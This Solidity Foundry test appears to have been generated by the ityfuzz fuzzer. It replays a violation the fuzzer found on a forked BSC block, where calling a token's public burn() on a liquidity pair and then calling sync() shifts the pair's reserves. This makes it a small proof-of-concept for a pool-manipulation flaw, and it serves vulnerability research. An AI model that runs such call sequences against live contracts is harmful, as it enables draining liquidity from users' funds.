// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c,0x10bc28d2810dD462E16facfF18f78783e859351b,0xF9e3151e813cd6729D52d9A0C3ee69F22CcE650A -c bsc --onchain-block-number 20969095 -f -i -p --onchain-etherscan-api-key $BSC_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Oracle ================
0xf9e3151e813cd6729d52d9a0c3ee69f22cce650a, Reserves changed from (0x00000000000000000000000000000000000000000000003b0390885800fede06_U256, 0x0000000000000000000000000000000000000000000000000024737ad333c263_U256) to (0x00000000000000000000000000000000000000000000003b0390885800fede06_U256, 0x0000000000000000000000000000000000000000000000000024737ad333e052_U256)

================ Trace ================
[Sender] 0xe1A425f1AC34A8a441566f93c82dD730639c8510
   ├─[1] 0x10bc28d2810dD462E16facfF18f78783e859351b.burn(0xF9e3151e813cd6729D52d9A0C3ee69F22CcE650A, 7663)
   └─[1] 0xF9e3151e813cd6729D52d9A0C3ee69F22CcE650A.sync()


 */

contract Cbb4C is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 20969095);
    }

    function test() public {
        address router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        address weth = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        
        vm.prank(0xe1A425f1AC34A8a441566f93c82dD730639c8510);
        
        0x10bc28d2810dD462E16facfF18f78783e859351b.call(abi.encodeWithSignature(
            "burn(address,uint256)",0xF9e3151e813cd6729D52d9A0C3ee69F22CcE650A, 7663
        )); 
        vm.prank(0xe1A425f1AC34A8a441566f93c82dD730639c8510);
        IERC20(0xF9e3151e813cd6729D52d9A0C3ee69F22CcE650A).sync();
        
    }

}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function skim(address to) external;
    function sync() external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
